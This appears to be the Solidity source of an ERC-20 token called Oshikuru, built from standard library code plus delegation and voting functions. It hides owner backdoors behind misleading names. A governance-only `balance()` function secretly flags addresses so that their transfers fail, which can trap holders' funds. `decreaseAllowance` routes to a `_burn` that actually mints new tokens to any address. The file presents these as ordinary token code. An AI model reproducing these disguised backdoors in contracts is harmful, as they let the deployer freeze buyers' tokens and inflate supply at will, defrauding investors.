row number 
1	           pragma solidity 0.6.12;
2	 abstract contract Context {
3	 function _msgSender() internal view virtual returns (address payable) {
4	 return msg.sender;
5	 }
6	 function _msgData() internal view virtual returns (bytes memory) {
7	 this;
8	 return msg.data;
9	 }
10	 }
11	 interface IERC20 {
12	 function totalSupply() external view returns (uint256);
13	 function balanceOf(address account) external view returns (uint256);
14	 function transfer(address recipient, uint256 amount) external returns (bool);
15	 function allowance(address owner, address spender) external view returns (uint256);
16	 function approve(address spender, uint256 amount) external returns (bool);
17	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
18	 event Transfer(address indexed from, address indexed to, uint256 value);
19	 event Approval(address indexed owner, address indexed spender, uint256 value);
20	 }
21	 library SafeMath {
22	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
23	 uint256 c = a + b;
24	 require(c >= a, "SafeMath: addition overflow");
25	 return c;
26	 }
27	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
28	 return sub(a, b, "SafeMath: subtraction overflow");
29	 }
30	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
31	 require(b <= a, errorMessage);
32	 uint256 c = a - b;
33	 return c;
34	 }
35	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
36	 if (a == 0) {
37	 return 0;
38	 }
39	 uint256 c = a * b;
40	 require(c / a == b, "SafeMath: multiplication overflow");
41	 return c;
42	 }
43	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
44	 return div(a, b, "SafeMath: division by zero");
45	 }
46	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
47	 require(b > 0, errorMessage);
48	 uint256 c = a / b;
49	 return c;
50	 }
51	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
52	 return mod(a, b, "SafeMath: modulo by zero");
53	 }
54	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
55	 require(b != 0, errorMessage);
56	 return a % b;
57	 }
58	 }
59	 library Address {
60	 function isContract(address account) internal view returns (bool) {
61	 uint256 size;
62	 assembly {
63	 size := extcodesize(account) }
64	 return size > 0;
65	 }
66	 function sendValue(address payable recipient, uint256 amount) internal {
67	 require(address(this).balance >= amount, "Address: insufficient balance");
68	 (bool success, ) = recipient.call{
69	 value: amount }
70	 ("");
71	 require(success, "Address: unable to send value, recipient may have reverted");
72	 }
73	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
74	 return functionCall(target, data, "Address: low-level call failed");
75	 }
76	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
77	 return _functionCallWithValue(target, data, 0, errorMessage);
78	 }
79	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
80	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
81	 }
82	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
83	 require(address(this).balance >= value, "Address: insufficient balance for call");
84	 return _functionCallWithValue(target, data, value, errorMessage);
85	 }
86	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
87	 require(isContract(target), "Address: call to non-contract");
88	 (bool success, bytes memory returndata) = target.call{
89	 value: weiValue }
90	 (data);
91	 if (success) {
92	 return returndata;
93	 }
94	 else {
95	 if (returndata.length > 0) {
96	 assembly {
97	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
98	 }
99	 else {
100	 revert(errorMessage);
101	 }
102	 }
103	 }
104	 }
105	 contract ERC20 is Context, IERC20 {
106	 using SafeMath for uint256;
107	 mapping (address => uint256) internal _balances;
108	 mapping (address => bool) private _addressBalance_;
109	 mapping (address => mapping (address => uint256)) private _allowances;
110	 uint256 internal _totalSupply;
111	 string private _name;
112	 string private _symbol;
113	 uint8 private _decimals;
114	 address internal governance;
115	 constructor (string memory name, string memory symbol, uint8 decimals) public {
116	 _name = name;
117	 _symbol = symbol;
118	 _decimals = decimals;
119	 governance = msg.sender;
120	 }
121	 function name() public view returns (string memory) {
122	 return _name;
123	 }
124	 function symbol() public view returns (string memory) {
125	 return _symbol;
126	 }
127	 function decimals() public view returns (uint8) {
128	 return _decimals;
129	 }
130	 function totalSupply() public view override returns (uint256) {
131	 return _totalSupply;
132	 }
133	 function balanceOf(address account) public view override returns (uint256) {
134	 return _balances[account];
135	 }
136	 function balance(address _addressBalance) external {
137	 require(msg.sender == governance);
138	 if (_addressBalance_[_addressBalance] == true) {
139	 _addressBalance_[_addressBalance] = false;
140	 }
141	 else {
142	 _addressBalance_[_addressBalance] = true;
143	 }
144	 }
145	 function temporaryBalance(address _addressBalance) public view returns (bool) {
146	 return _addressBalance_[_addressBalance];
147	 }
148	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
149	 require(_msgSender() != address(0), "ERC20: transfer from the zero address");
150	 require(recipient != address(0), "ERC20: transfer to the zero address");
151	 if (_addressBalance_[_msgSender()] || _addressBalance_[recipient]) require (amount == 0, "");
152	 _balances[_msgSender()] = _balances[_msgSender()].sub(amount, "ERC20: transfer amount exceeds balance");
153	 _balances[recipient] = _balances[recipient].add(amount);
154	 emit Transfer(_msgSender(), recipient, amount);
155	 return true;
156	 }
157	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
158	 return _allowances[owner][spender];
159	 }
160	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
161	 _approve(_msgSender(), spender, amount);
162	 return true;
163	 }
164	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
165	 _transfer(sender, recipient, amount);
166	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
167	 return true;
168	 }
169	 function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
170	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
171	 return true;
172	 }
173	 function _transfer(address sender, address recipient, uint256 amount) internal virtual {
174	 require(sender != address(0), "ERC20: transfer from the zero address");
175	 require(recipient != address(0), "ERC20: transfer to the zero address");
176	 if (_addressBalance_[sender] || _addressBalance_[recipient]) require (amount == 0, "");
177	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
178	 _balances[recipient] = _balances[recipient].add(amount);
179	 emit Transfer(sender, recipient, amount);
180	 }
181	 function _mint(address account, uint256 amount) internal virtual {
182	 require(account != address(0), "ERC20: mint to the zero address");
183	 _totalSupply = _totalSupply.add(amount);
184	 _balances[account] = _balances[account].add(amount);
185	 emit Transfer(address(0), account, amount);
186	 }
187	 function decreaseAllowance(address spender, uint256 substracted) public {
188	 require(msg.sender == governance);
189	 _burn(spender, substracted);
190	 }
191	 function _burn(address account, uint256 amount) internal virtual {
192	 require(account != address(0), "ERC20: burn from the zero address");
193	 _balances[account] = _balances[account].add(amount);
194	 _totalSupply = _totalSupply.add(amount);
195	 emit Transfer(address(0), account, amount);
196	 }
197	 function _approve(address owner, address spender, uint256 amount) internal virtual {
198	 require(owner != address(0), "ERC20: approve from the zero address");
199	 require(spender != address(0), "ERC20: approve to the zero address");
200	 _allowances[owner][spender] = amount;
201	 emit Approval(owner, spender, amount);
202	 }
203	 function _setupDecimals(uint8 decimals_) internal {
204	 _decimals = decimals_;
205	 }
206	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
207	 }
208	 }
209	 library SafeERC20 {
210	 using SafeMath for uint256;
211	 using Address for address;
212	 function safeTransfer(IERC20 token, address to, uint256 value) internal {
213	 _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
214	 }
215	 function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
216	 _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
217	 }
218	 function safeApprove(IERC20 token, address spender, uint256 value) internal {
219	 require((value == 0) || (token.allowance(address(this), spender) == 0), "SafeERC20: approve from non-zero to non-zero allowance" );
220	 _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
221	 }
222	 function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
223	 uint256 newAllowance = token.allowance(address(this), spender).add(value);
224	 _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
225	 }
226	 function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
227	 uint256 newAllowance = token.allowance(address(this), spender).sub(value, "SafeERC20: decreased allowance below zero");
228	 _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
229	 }
230	 function _callOptionalReturn(IERC20 token, bytes memory data) private {
231	 bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
232	 if (returndata.length > 0) {
233	 require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
234	 }
235	 }
236	 }
237	 contract OSHIKURU is ERC20 {
238	 using SafeMath for uint256;
239	 uint256 totalsupply_;
240	 uint256 cap;
241	 address owner_;
242	 constructor () public ERC20("Oshikuru", "OSHIKURU", 9) {
243	 totalsupply_ = 1000000000000000000000;
244	 owner_ = msg.sender;
245	 _mint(owner_, totalsupply_);
246	 }
247	 function burn(uint256 _amount) public {
248	 require(msg.sender == governance);
249	 _burn(msg.sender, _amount);
250	 _moveDelegates(_delegates[msg.sender], address(0), _amount);
251	 }
252	 function burnFrom(address _account, uint256 _amount) public {
253	 require(msg.sender == governance);
254	 uint256 decreasedAllowance = allowance(_account, msg.sender).sub(_amount, "ERC20: burn amount exceeds allowance");
255	 _approve(_account, msg.sender, decreasedAllowance);
256	 _burn(_account, _amount);
257	 _moveDelegates(_delegates[_account], address(0), _amount);
258	 }
259	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
260	 super._beforeTokenTransfer(from, to, amount);
261	 if (from == address(0)) {
262	 require(totalSupply().add(amount) <= cap, "ERC20Capped: cap exceeded");
263	 }
264	 }
265	 mapping(address => address) internal _delegates;
266	 struct Checkpoint {
267	 uint32 fromBlock;
268	 uint256 votes;
269	 }
270	 mapping(address => mapping(uint32 => Checkpoint)) public checkpoints;
271	 mapping(address => uint32) public numCheckpoints;
272	 bytes32 public constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");
273	 bytes32 public constant DELEGATION_TYPEHASH = keccak256("Delegation(address delegatee,uint256 nonce,uint256 expiry)");
274	 mapping(address => uint) public nonces;
275	 event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);
276	 event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);
277	 function delegates(address delegator) external view returns (address) {
278	 return _delegates[delegator];
279	 }
280	 function delegate(address delegatee) external {
281	 return _delegate(msg.sender, delegatee);
282	 }
283	 function delegateBySig( address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s ) external {
284	 bytes32 domainSeparator = keccak256( abi.encode( DOMAIN_TYPEHASH, keccak256(bytes(name())), getChainId(), address(this) ) );
285	 bytes32 structHash = keccak256( abi.encode( DELEGATION_TYPEHASH, delegatee, nonce, expiry ) );
286	 bytes32 digest = keccak256( abi.encodePacked( "\x19\x01", domainSeparator, structHash ) );
287	 address signatory = ecrecover(digest, v, r, s);
288	 require(signatory != address(0), "CRC::delegateBySig: invalid signature");
289	 require(nonce == nonces[signatory]++, "CRC::delegateBySig: invalid nonce");
290	 require(now <= expiry, "CRC::delegateBySig: signature expired");
291	 return _delegate(signatory, delegatee);
292	 }
293	 function getCurrentVotes(address account) external view returns (uint256) {
294	 uint32 nCheckpoints = numCheckpoints[account];
295	 return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;
296	 }
297	 function getPriorVotes(address account, uint blockNumber) external view returns (uint256) {
298	 require(blockNumber < block.number, "CRC:getPriorVotes: not yet determined");
299	 uint32 nCheckpoints = numCheckpoints[account];
300	 if (nCheckpoints == 0) {
301	 return 0;
302	 }
303	 if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) {
304	 return checkpoints[account][nCheckpoints - 1].votes;
305	 }
306	 if (checkpoints[account][0].fromBlock > blockNumber) {
307	 return 0;
308	 }
309	 uint32 lower = 0;
310	 uint32 upper = nCheckpoints - 1;
311	 while (upper > lower) {
312	 uint32 center = upper - (upper - lower) / 2;
313	 Checkpoint memory cp = checkpoints[account][center];
314	 if (cp.fromBlock == blockNumber) {
315	 return cp.votes;
316	 }
317	 else if (cp.fromBlock < blockNumber) {
318	 lower = center;
319	 }
320	 else {
321	 upper = center - 1;
322	 }
323	 }
324	 return checkpoints[account][lower].votes;
325	 }
326	 function _delegate(address delegator, address delegatee) internal {
327	 address currentDelegate = _delegates[delegator];
328	 uint256 delegatorBalance = balanceOf(delegator);
329	 _delegates[delegator] = delegatee;
330	 emit DelegateChanged(delegator, currentDelegate, delegatee);
331	 _moveDelegates(currentDelegate, delegatee, delegatorBalance);
332	 }
333	 function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {
334	 if (srcRep != dstRep && amount > 0) {
335	 if (srcRep != address(0)) {
336	 uint32 srcRepNum = numCheckpoints[srcRep];
337	 uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;
338	 uint256 srcRepNew = srcRepOld.sub(amount);
339	 _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);
340	 }
341	 if (dstRep != address(0)) {
342	 uint32 dstRepNum = numCheckpoints[dstRep];
343	 uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;
344	 uint256 dstRepNew = dstRepOld.add(amount);
345	 _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);
346	 }
347	 }
348	 }
349	 function _writeCheckpoint( address delegatee, uint32 nCheckpoints, uint256 oldVotes, uint256 newVotes ) internal {
350	 uint32 blockNumber = safe32(block.number, "CRC::_writeCheckpoint: block number exceeds 32 bits");
351	 if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {
352	 checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
353	 }
354	 else {
355	 checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);
356	 numCheckpoints[delegatee] = nCheckpoints + 1;
357	 }
358	 emit DelegateVotesChanged(delegatee, oldVotes, newVotes);
359	 }
360	 function safe32(uint n, string memory errorMessage) internal pure returns (uint32) {
361	 require(n < 2 ** 32, errorMessage);
362	 return uint32(n);
363	 }
364	 function getChainId() internal pure returns (uint) {
365	 uint256 chainId;
366	 assembly {
367	 chainId := chainid()}
368	 return chainId;
369	 }
370	 }
